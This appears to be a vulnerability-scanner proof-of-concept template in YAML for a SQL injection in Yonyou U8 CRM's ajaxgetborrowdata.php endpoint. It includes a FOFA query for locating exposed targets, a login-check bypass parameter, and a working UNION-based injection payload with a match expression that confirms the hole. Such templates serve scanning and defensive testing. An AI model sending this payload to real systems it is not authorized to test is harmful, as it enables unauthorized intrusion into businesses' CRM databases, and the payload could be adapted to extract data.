id: poc-yaml-yongyon-u8-crm-ajaxgetborrowdata-php-sqli
info:
  name: 用友U8 CRM ajaxgetborrowdata.php SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 用友U8+CRM
  fofa: body="用友U8CRM"
variables:
  t1: random_int(1000,10000)
  t2: md5(t1)
requests:
- method: POST
  path: /borrowout/ajaxgetborrowdata.php?DontCheckLogin=1&Action=getWarehouseOtherInfo
  headers:
    Content-Type: application/x-www-form-urlencoded
    Cookie: PHPSESSID=bgsesstimeout-;
  data: cWhCode=1%27+UNION+ALL+SELECT+sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}'))--+KRVC
  expression: status_code == 200 && contains(body,"\"success\":true") && contains(body,"0x"
    + t2) && !contains(body,"<")
transport: http
